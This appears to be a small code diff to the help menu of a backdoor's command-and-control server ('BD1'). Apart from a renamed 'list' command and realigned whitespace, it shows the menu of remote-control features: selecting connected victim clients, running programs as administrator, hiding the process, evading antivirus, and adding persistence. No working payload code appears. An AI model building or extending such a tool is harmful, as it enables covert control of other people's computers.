@@ -262,7 +262,7 @@ class Allclients:
 Available Commands:
   General:
     help                     - Show this help message (✔)
-    list                     - List all connected clients (✔)
+    lists                    - List all connected clients (✔)
     select <client_id>       - Select a client to control (✔)
     exit                     - Exit the server (✔)
 
@@ -279,8 +279,8 @@ Available Commands:
 
   Evade & Hide:
     runadmin <program> [args]     - Run program as administrator (✔)
-    hideself (Auto)            - Hide BD1 process (✔)
-    evadeanti (Auto)           - Apply antivirus evasion techniques (✔)
+    hideself (Auto)               - Hide BD1 process (✔)
+    evadeanti (Auto)              - Apply antivirus evasion techniques (✔)
 
   Persistence & Cleanup
     persist all          - Add all persistence methods (✔)
